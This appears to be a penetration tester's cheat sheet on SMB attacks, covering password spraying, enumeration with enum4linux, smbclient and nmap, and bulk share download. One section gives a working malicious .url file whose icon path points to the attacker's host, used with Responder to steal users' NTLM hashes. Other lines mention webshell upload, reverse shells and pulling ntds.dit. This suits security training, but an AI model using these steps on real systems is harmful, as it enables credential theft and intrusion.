#### Password Spraying
nxc smb
	use this to determine if any creds you have are valid

#### Automated Enum
enum4linux
	quick automated SMB check
	not always reliable
	if results come back, look THOUROUGHLY (cleartext passwords possible)
	anonymous auth
		`enum4linux <ip>`
	authenticated
		`enum4linux -u <user> -p <pass> -w <domain> <ip>`

nbtscan
```
sudo nbtscan -r 192.168.50.0/24 #IP or range can be provided
```

Vulns:
```
nmap -script=smb-vuln\* -p445 <ip>
```

#### Manual Enum
Test anonymous authentication
	`smbclient -N -L \\\\<ip_address>
		List shares
	`smbclient -N \\\\<ip_address>\\<share>
	If unsuccessful, try user auth
```
Note, linux boxes you forward slash //
```

DO NOT IGNORE ANY FOLDERS, INCLUDING NETLOGON AND SYSVOL

User authentication
	`smbclient -L \\\\<ip_address> --user <user> --workgroup <domain>
		lists shares
	`smbclient \\\\<ip_address>\\<share> --user <user> --workgroup <domain>`

Download whole shares
```
# If theres a lot to parse, it might be useful to grab it all and 'tree' it

mask ""
recurse ON
prompt OFF
mget *

```


#### PUT Files Abuse
can you put files to the SMB server?
	yes?
		try responder to catch a user hash:
```
1. Create file 'EVIL.url' with this malicious code:

[InternetShortcut]  
URL=Random_nonsense  
WorkingDirectory=Flibertygibbit  
IconFile=\\<YOUR tun0 IP>\%USERNAME%.icon  
IconIndex=1



2. Start responder

	sudo responder -I tun0 -wv



3. Upload EVIL.url to SMB share

4. Check Responder for user hash

```
Learn more about similar attacks [here ](https://github.com/Greenwolf/ntlm_theft?source=post_page-----158516460860---------------------------------------)

#### File Transfer
Might be able leverage SMB to upload a webshell, then get a reverse shell...

Also, adjusting `timeout` value can be useful for large file transfer such as SYSTEM, ntds.dit, etc...
	`timeout <time_in_seconds>`
	default is 0
	so
		`timeout 1000` should be sufficient for anything

#### Bloodhound
